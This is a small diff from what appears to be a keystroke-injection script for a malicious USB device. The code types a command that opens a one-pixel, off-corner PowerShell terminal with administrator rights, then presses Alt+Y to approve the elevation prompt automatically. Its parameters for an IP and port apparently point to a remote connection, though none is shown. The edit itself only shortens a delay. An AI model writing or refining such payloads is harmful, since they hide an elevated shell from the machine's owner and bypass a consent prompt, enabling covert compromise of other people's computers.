@@ -18,7 +18,7 @@ def vel(ip,port,installer):
     layout.write("wt --size 1,1 --pos 1915,1075 -p 'powershell'")
     kbd.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
     kbd.release_all()
-    time.sleep(4)
+    time.sleep(3)
     kbd.press(Keycode.ALT, Keycode.Y)
     kbd.release_all()                                                                                                                             
     time.sleep(3)
